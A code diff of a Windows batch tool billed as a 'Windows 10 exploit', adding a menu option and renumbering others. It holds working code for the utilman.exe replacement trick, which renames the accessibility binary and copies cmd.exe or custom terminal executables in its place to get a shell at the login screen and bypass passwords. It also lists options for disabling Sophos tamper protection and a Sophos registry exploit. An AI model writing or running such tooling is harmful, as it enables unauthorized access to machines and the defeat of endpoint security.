@@ -28,26 +28,27 @@ echo ^|==================================^|
 echo ^|  WINDOWS 10 EXPLOIT BY Viren070  ^|
 echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
 echo ^|                                  ^|
-echo ^|    BUILD ^| Production 23.9.5     ^|
+echo ^|    BUILD ^| Production 23.9.6     ^|
 echo ^|==================================^| & echo: & echo: & echo:
 
 echo +++++ Accessibility Menu Exploit
 echo ^[1^] Replace with CMD
-echo ^[2^] Replace with PowerShell Terminal Script 
-echo ^[3^] Undo Password Exploit
-echo ^[4^] Restore Original Files
+echo ^[2^] Replace with CMD Terminal Script
+echo ^[3^] Replace with PowerShell Terminal Script 
+echo ^[4^] Undo Password Exploit
+echo ^[5^] Restore Original Files
 
 echo: & echo +++++ Sophos Exploit
-echo ^[5^] Disable Sophos Tamper Protection
-echo ^[6^] Sophos Registry Exploit
+echo ^[6^] Disable Sophos Tamper Protection
+echo ^[7^] Sophos Registry Exploit
 
 echo: & echo +++++ Other
-echo ^[7^] Show On-Screen Keyboard
+echo ^[8^] Show On-Screen Keyboard
 echo: & echo +++++ Exit
 echo ^[0^] Exit
 echo: & echo: & echo:
 
-set validOptions=0 1 2 3 4 5 6 7
+set validOptions=0 1 2 3 4 5 6 7 8
 set "crackType="
 set /p "crackType=^>"
 
@@ -74,29 +75,31 @@ if "!crackType!" EQU "0" (
 )
 
 if "!crackType!" EQU "1" (
-  call :local-password-exploit
+  call :replace-with-cmd-exe
 )
-
 if "!crackType!" EQU "2" (
-  call :local-password-exploit-powershell-script
+  call :replace-with-cmd-terminal-script
 )
-
 if "!crackType!" EQU "3" (
-  call :undo-password-exploit
+  call :replace-with-powershell-terminal-script
 )
 
 if "!crackType!" EQU "4" (
-  call :restore-original-files
+  call :undo-accessibilty-exploit
 )
 
 if "!crackType!" EQU "5" (
+  call :restore-original-files
+)
+
+if "!crackType!" EQU "6" (
   call :disable-sophos-tamper-protection
 )
-if "!crackType!" EQU "6" (
+if "!crackType!" EQU "7" (
   call :sophos-registry-exploit
 )
 
-if "!crackType!" EQU "7" (
+if "!crackType!" EQU "8" (
   echo Running OSK.exe...
   start "" "C:\windows\system32\osk.exe" || goto :cmdFail
   color 0A
@@ -111,7 +114,7 @@ if "!crackType!" EQU "7" (
 goto :menu
 
 
-:local-password-exploit
+:replace-with-cmd-exe
 cls
 set "UtilmanOldPath=C:\Windows\System32\utilman.old"
 echo Starting Hack... & echo:
@@ -141,8 +144,41 @@ if exist "c:\windows\system32" (
   goto :cmdFail
 )
 
+:replace-with-cmd-terminal-script
+cls
+echo Starting Hack...
+echo. 
+set "UtilmanPath=C:\Windows\System32\utilman.exe"
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+set "CMDScriptPath=X:\sources\CMD_Terminal.exe"
 
-:local-password-exploit-powershell-script 
+if exist "%UtilmanOldPath%" (
+  echo Deleting existing utilman.old & echo. 
+  del "%UtilmanOldPath%" || goto :cmdFail
+)
+if not exist "%CMDScriptPath%" (
+  echo CMD_Terminal.exe not found. & echo. 
+  goto :cmdFail
+)
+if exist "%UtilmanPath%" (
+  echo Renaming utilman.exe to utilman.old 
+  ren "%UtilmanPath%" utilman.old || goto :cmdFail
+  echo. 
+  echo Copying CMD Terminal Script EXE to utilman.exe 
+  copy "%CMDScriptPath%" "%UtilmanPath%" || goto :cmdFail
+) else (
+  echo Utilman.exe not found in the specified path: "%UtilmanPath%"
+  goto :cmdFail
+)
+
+echo -----------------------------------
+color 0A
+echo Exploit Completed ^| No errors
+pause
+goto menu
+
+
+:replace-with-powershell-terminal-script 
 cls
 echo Starting Hack...
 echo. 
@@ -155,14 +191,14 @@ if exist "%UtilmanOldPath%" (
   del "%UtilmanOldPath%" || goto :cmdFail
 )
 if not exist "%PowerShellScriptPath%" (
-  echo PowerShell_Script.exe not found. & echo. 
+  echo PowerShell_Terminal.exe not found. & echo. 
   goto :cmdFail
 )
 if exist "%UtilmanPath%" (
   echo Renaming utilman.exe to utilman.old 
   ren "%UtilmanPath%" utilman.old || goto :cmdFail
   echo. 
-  echo Copying powershell script exe to utilman.exe 
+  echo Copying PowerShell Terminal Script EXE to utilman.exe 
   copy "%PowerShellScriptPath%" "%UtilmanPath%" || goto :cmdFail
 ) else (
   echo Utilman.exe not found in the specified path: "%UtilmanPath%"
@@ -256,7 +292,7 @@ echo Returning to Menu
 timeout /t 5
 goto menu 
 
-:undo-password-exploit
+:undo-accessibilty-exploit
 cls
 echo Preparing restore...
 if not exist "c:\windows\system32" (
